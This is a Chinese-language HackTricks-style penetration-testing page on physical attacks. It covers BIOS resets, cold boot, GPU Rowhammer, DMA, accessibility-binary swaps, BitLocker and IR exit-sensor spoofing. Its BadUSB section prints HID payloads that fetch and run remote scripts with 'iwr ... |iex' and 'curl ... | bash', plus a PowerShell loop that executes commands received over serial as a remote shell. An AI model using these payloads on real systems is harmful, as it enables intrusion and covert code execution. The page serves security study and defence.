# 物理攻击

{{#include ../banners/hacktricks-training.md}}

## BIOS 密码恢复与系统安全

旧式 PC 固件设置可能通过断开 CMOS 电池或使用文档中说明的 clear-CMOS 跳线来重置。所需的断电时间因主板而异；现代 UEFI 密码或密钥可能存储在非易失性闪存、嵌入式控制器或安全设备中，因此即使取出电池也会保留。短接针脚前请查阅主板/维修手册；此操作也可能导致 TPM 度量值失效并触发磁盘加密恢复。

在旧式 x86 系统上，**killCMOS** 和 **CmosPwd** 等工具可以从可启动环境检查或修改由 CMOS 保存的设置。CmosPwd 可识别一组文档所列的旧 BIOS 系列的密码格式，并能备份、恢复或擦除/清除 CMOS 状态；其公开版本面向旧式 DOS/Windows、Linux、FreeBSD 和 NetBSD 环境。<sup>[[18]](#references)</sup> 这些实用程序不是通用的 UEFI 密码移除工具，且需要足够的硬件/固件访问权限。

部分笔记本电脑固件在多次密码尝试失败后会显示厂商专属的挑战码。像 [bios-pw.org](https://bios-pw.org) 这样的数据库可以为部分型号推导出旧式厂商恢复密码，但许多系统采用的锁定机制无法通过挑战码推导密码。请将生成的密码视为特定型号专用，并避免耗尽永久尝试次数。

### UEFI 安全性

对于现代 **UEFI** 系统，CHIPSEC 可审计 Secure Boot 变量保护。请先运行下面的非修改性检查；可选的 `-a modify` 模式会故意尝试破坏变量，因此只能用于可恢复的实验室系统。CHIPSEC 本身警告称，其特权驱动程序和低级硬件访问不适用于生产终端。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM 分析与冷启动攻击

DRAM 停止刷新后，不会立即丢失所有位。数据衰减速率因模块技术和温度而有很大差异；与未冷却的断电重启相比，冷却能让有用数据保留更久。冷启动攻击会快速重启至小型采集环境，或转移已冷却的内存模块，捕获原始内存，并在位衰减的情况下重建加密密钥。磁盘复制工具不一定能成像物理内存，而 Volatility 用于分析捕获的数据，并不负责采集；应使用适用于相应平台且经过验证的采集工具。<sup>[[12]](#references)</sup>

---

## 针对页表的 GPU Rowhammer

现代 GPU Rowhammer 攻击若针对 **GPU 虚拟内存元数据**，而不是普通缓冲区，就会更具实用价值。近期针对 **GDDR6 NVIDIA Ampere GPU** 的研究表明，攻击者可运行低权限 CUDA 代码，构造适用于 GPU 的 hammering 模式，利用 **memory massaging** 将分页结构放入易受攻击的行，进而翻转**末级页表**或中间**页目录**中的位。只要一个地址转换条目遭到破坏，攻击者就能进一步获得**任意 GPU 内存读写**能力，并由此转向攻陷主机。<sup>[[1]](#references)[[2]](#references)</sup>

### 利用模式

1. **分析可 hammer 的行**，在 GDDR6 中构造能绕过 DRAM 内部缓解机制、且会考虑刷新机制和非均匀性的 hammering 模式。
2. **调整 GPU 分配**，让驱动程序将地址转换结构放入易受攻击的物理位置，而不是默认的受保护内存池。实际操作中，可能需要耗尽低内存页表区域，并以可控步长大量分配稀疏的 UVM 映射。
3. **翻转地址转换元数据**，例如页表／页目录条目中的 **PFN** 或与 aperture 相关的位，使攻击者控制的虚拟页解析到页表页面、任意 GPU 内存或主机可见的系统映射。
4. 重用伪造的映射来改写其他地址转换条目，进而在 GPU 上下文之间取得**任意 GPU 内存读写**能力。

### 转向主机与缓解措施

- **禁用 IOMMU** 时，伪造的 system-aperture 映射可能将任意**主机物理内存**暴露给 GPU，使 GPU 原语升级为完全攻陷主机。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** 针对末级页表条目，而 **GeForge** 表明，破坏页目录层可能更容易，因为翻转一个位就能重定向更大的地址转换子树。不要只将某一层分页视为安全关键层。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** 仍然重要，因为它能阻断 GDDRHammer/GeForge 使用的直接任意主机内存访问路径，但它**并非完整的缓解措施**。**GPUBreach** 展示了另一种二阶段转向方式：攻击者破坏 GPU 可写、由驱动程序拥有的 CPU 缓冲区，再触发 NVIDIA 驱动程序的内存安全漏洞，从而获得内核写入原语，并取得 **root shell**，即使 IOMMU 已启用也不例外。<sup>[[3]](#references)</sup>
- 对受支持的工作站／服务器 GPU，**系统级 ECC** 是实用的加固措施。没有 ECC 的消费级 GPU，其防御能力较弱。<sup>[[4]](#references)</sup>
- 这些攻击并非纯理论：**GeForge** 在 RTX 3060 上报告了 **1,171** 次位翻转，在 RTX A6000 上报告了 **202** 次，足以构建可用的主机权限提升攻击链。<sup>[[2]](#references)[[9]](#references)</sup>

---

## 直接内存访问（DMA）攻击

如需了解离线 UEFI IFR/NVRAM 补丁修改，可降低启动前 IOMMU 强制执行级别并启用 Windows DMA 攻击链的内容，请参阅：

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** 展示了如何通过 FireWire 和早期 Thunderbolt 配置等接口执行基于 **DMA 的内存采集与补丁修改**，其中包括历史上的登录绕过特征。这并非简单地“对 Windows 10 无效”：能否利用取决于接口、目标版本、IOMMU 策略、锁定状态，以及 Windows Kernel DMA Protection 是否受支持并已启用。Windows 10 version 1803 及更高版本在兼容平台上引入了 Kernel DMA Protection，大幅改变了攻击面。<sup>[[13]](#references)[[14]](#references)</sup>

---

## 使用 Live CD/USB 访问系统

对于未加密或已解锁的 Windows 卷，可在离线环境中将 **sethc.exe** 或 **Utilman.exe** 等辅助功能二进制文件替换为 **cmd.exe**，这样在登录屏幕上触发相应快捷键时，就会得到 SYSTEM 命令提示符。**chntpw** 等工具可编辑本地 SAM 账户数据。这些方法无法绕过已锁定的 BitLocker 卷，也可能损坏受 DPAPI/EFS 保护的凭据；应保留取证副本和备份。

**Kon-Boot** 是一款商业启动时身份验证绕过工具，适用于受支持的 Windows/macOS 配置。兼容性取决于操作系统、固件模式、Secure Boot 和磁盘加密设置；它无法解密已锁定的 BitLocker 卷。<sup>[[10]](#references)</sup>

---

## 处理 Windows 安全功能

### 启动与恢复快捷键

- **Delete/Supr**、F2、F10 或其他厂商按键可能会打开固件设置。
- 只有在仍启用该路径的配置中，**F8** 才能进入旧版 Windows 高级启动选项；当前的恢复入口因配置而异。
- 在某些配置中，按住 **Shift** 可以阻止 Windows 自动登录，但策略／注册表设置可能会禁用此行为。<sup>[[17]](#references)</sup>

### 恶意 USB 设备

**USB Rubber Ducky** 和 Teensy 开发板等设备可以伪装成受信任的 HID 键盘，并注入预先定义的按键。载荷最初拥有已登录会话的权限和桌面访问能力；UAC 提示、屏幕锁定、键盘布局、时序以及终端 USB 策略仍会对其构成限制。<sup>[[15]](#references)</sup>

### 卷影复制

管理员或备份权限可用于创建卷影副本或保存注册表 hive，从而获取 **SAM** 和 **SYSTEM** 等锁定文件。这是失陷后的收集技术，并非权限绕过；应将其与 `diskshadow`/VSS 及注册表 hive 导出事件进行关联分析。

## BadUSB / HID Implant 技术

### Wi-Fi 管理型线缆植入物

- 基于 ESP32-S3 的植入物（如 **Evil Crow Cable Wind**）隐藏在 USB-A→USB-C 或 USB-C↔USB-C 线缆中，仅枚举为 USB 键盘，并通过 Wi-Fi 提供 C2 协议栈。操作人员只需从受害者主机为线缆供电，创建名称为 `Evil Crow Cable Wind`、密码为 `123456789` 的热点，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP 地址），即可进入内嵌的 HTTP 界面。<sup>[[8]](#references)</sup>
- 浏览器 UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* 选项卡。保存的载荷会按操作系统标记，键盘布局可即时切换，VID/PID 字符串也可修改，以伪装成已知外设。
- 由于 C2 位于线缆内部，手机无需使用组织网络即可准备载荷、触发执行并管理 Wi-Fi 凭据，因此适用于驻留时间较短的物理入侵。

### 感知操作系统的 AutoExec 载荷

- AutoExec 规则会将一个或多个载荷绑定为在 USB 枚举后立即执行。植入物会进行轻量级 OS 指纹识别，并选择对应脚本。
- 示例工作流程：
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）或 `CTRL ALT T`（终端）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 由于执行过程无需人工干预，只需更换充电线缆，就能在已登录用户的上下文中实现“即插即攻”的初始访问。

### 通过 Wi-Fi TCP 建立由 HID 引导的远程 shell

1. **按键引导：**已保存的载荷会打开控制台，并粘贴一个循环，使其执行新 USB 串行设备收到的所有内容。一个精简的 Windows 版本如下：

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge：**该 implant 会保持 USB CDC channel 开启，同时由其 ESP32-S3 启动 TCP client（Python script、Android APK 或桌面可执行文件），连接回 operator。输入 TCP session 的任何字节都会被转发到上面的 serial loop，从而即使在 air-gapped 主机上也能实现远程命令执行。输出有限，因此 operators 通常会运行盲命令（创建帐户、暂存其他工具等）。

### HTTP OTA 更新面

- 文档中介绍的 Evil Crow Cable Wind 界面在 `/update` 暴露了一个未经身份验证的固件更新 endpoint：<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- 现场操作人员可以在交战过程中热插拔功能（例如刷入 USB Army Knife 固件），而无需断开线缆，让 implant 在仍连接目标主机时 pivot 到新功能。

## 绕过 BitLocker 加密

对正在运行或最近运行过的系统进行授权取证采集时，如果 BitLocker 卷处于解锁状态，采集内容中可能包含 BitLocker 卷主密钥或相关密钥材料。Elcomsoft Forensic Disk Decryptor 和 Passware Kit Forensic 等商业工具可以搜索受支持的内存映像、休眠文件或崩溃转储，但不保证成功。启用 BitLocker 时，现代 Windows 也会加密崩溃转储；存储的 48 位恢复密码与内存中的卷密钥是不同的取证对象。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 通过社会工程添加恢复密钥

如果攻击者诱使管理员运行 BitLocker 管理命令，就可以添加恢复密码、外部密钥或其他保护器，然后获取该密钥。恢复密码不能是任意的全零字符串：BitLocker 数字恢复密码必须符合经过验证的 48 位格式。相关的授权管理命令语法为 `manage-bde -protectors -add C: -recoverypassword`；使用 `manage-bde -protectors -get C:` 列出生成的保护器。监控保护器添加操作，并确保新恢复材料仅托管在获批位置。<sup>[[16]](#references)</sup>

---

## 利用机箱入侵/维护开关将 BIOS 恢复出厂设置

许多现代笔记本电脑和小型台式机都配有**机箱入侵开关**，由嵌入式控制器（EC）和 BIOS/UEFI 固件监控。该开关的主要用途是在设备被打开时发出警报，但有些厂商会实现一种**未公开的恢复快捷方式**，在开关按特定模式切换时触发。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻击原理

1. 开关连接到 EC 上的 **GPIO 中断**。
2. 在 EC 上运行的固件会记录**按下的时间间隔和次数**。
3. 当识别到硬编码的模式后，EC 会调用 *主板重置*例程，**擦除系统 NVRAM/CMOS 的内容**。
4. 下次启动时，受影响的机型会加载重置后的固件状态。根据厂商和硬件修订版本，被清除的状态可能包括管理员密码、自定义启动设置或已注册的 Secure Boot 密钥；TPM 状态和磁盘加密的影响需要单独评估。

> 固件重置可能会恢复从外部设备启动的选项，但**不会**解密存储设备。TPM/固件发生变化后，BitLocker 或其他全盘加密系统可能进入恢复模式；没有恢复密钥时，内部驱动器仍会受到保护。<sup>[[16]](#references)</sup>

### 真实案例——Framework 13 笔记本电脑

Framework 13（第 11/12/13 代）的恢复快捷方式如下：

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

第十次循环后，EC 会设置一个标志，指示 BIOS 在下次重启时清除 NVRAM。整个过程约需 40 秒，**只需要一把螺丝刀**。<sup>[[5]](#references)</sup>

### 通用利用流程

1. 开机或从挂起状态恢复目标设备，使 EC 处于运行状态。
2. 拆下底盖，露出入侵/维护开关。
3. 重现厂商特定的切换模式（查阅文档、论坛，或对 EC 固件进行逆向工程）。
4. 重新组装并重启，然后检查哪些固件设置和凭据确实发生了变化。
5. 如果已获授权且支持外部启动，可启动受控的 live image。内部卷经合法解锁后（或从未加密时），live 环境便可获取凭据和数据，或检查 EFI System Partition。修改该分区以安装 EFI implant 具有持久性且侵入性极强，并且仍受 Secure Boot、measured boot、固件写保护和 endpoint monitoring 的限制。没有密钥或恢复材料，就无法访问加密存储。

### 检测与缓解

* 在 OS 管理控制台中记录机箱入侵事件，并与异常 BIOS 重置情况进行关联。
* 在螺丝/盖板上使用**防拆封条**，以便检测是否被打开。
* 将设备存放在**受物理管控的区域**；假设物理访问等同于完全失陷。
* 如果设备支持，可禁用厂商的“维护开关重置”功能，或要求通过额外的加密授权才能重置 NVRAM。

---

## 针对无接触出门传感器的隐蔽 IR 注入

### 传感器特性
- 常见的“挥手出门”传感器将近红外 LED 发射器与类似电视遥控器的接收模块配对；接收模块只有在检测到多个（约 4–10 个）频率正确的脉冲（载波频率约为 30 kHz）后，才会输出高电平。<sup>[[7]](#references)</sup>
- 塑料遮罩阻止发射器和接收器彼此直视，因此控制器会假设任何经过验证的载波都来自附近的反射，并驱动继电器打开门锁。
- 控制器一旦认为检测到目标，通常会改变向外发射的调制包络，但接收器仍会接受任何符合滤波后载波特征的突发信号。

### 攻击流程
1. **捕获发射特征** – 将逻辑分析仪夹接到控制器引脚上，记录驱动内部 IR LED 的检测前和检测后波形。
2. **仅重放“检测后”波形** – 移除或忽略原装发射器，从一开始就用外部 IR LED 发出已经触发的信号模式。由于接收器只关注脉冲数量/频率，因此会将伪造载波视为真实反射，并触发继电器线路。
3. **控制传输时序** – 以经过调校的突发信号发射载波（例如，开启数十毫秒，再关闭相近时长），在不使接收器的 AGC 或干扰处理逻辑饱和的情况下，提供所需的最小脉冲数。持续发射会很快使传感器灵敏度下降，并导致继电器停止触发。

### 远距离反射式注入
- 将实验台上的 LED 换成大功率 IR 二极管、MOSFET 驱动器和聚焦光学元件后，即可在约 6 m 外可靠触发传感器。
- 攻击者无需与接收器孔径保持视线直通；将光束对准透过玻璃可见的室内墙壁、货架或门框，反射能量即可进入约 30° 的视野，模拟近距离挥手。
- 由于接收器预期检测到的只是微弱反射，强得多的外部光束可在多个表面上反射后，仍高于检测阈值。

### 武器化攻击手电筒
- 将驱动器嵌入商用手电筒中，可将工具隐藏在众目睽睽之下。将可见光 LED 换成与接收器波段匹配的大功率 IR LED，添加 ATtiny412（或类似芯片）以生成约 30 kHz 的突发信号，并使用 MOSFET 来吸收 LED 电流。
- 伸缩变焦镜头可收窄光束，以提升射程和精度；由 MCU 控制的振动马达则可在不发出可见光的情况下，通过触觉反馈确认调制已启用。
- 循环使用几种已存储的调制模式（载波频率和包络略有不同），可提高对不同贴牌传感器系列的兼容性，让操作者扫描反射表面，直至听到继电器咔嗒作响、门锁打开。

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)

{{#include ../banners/hacktricks-training.md}}
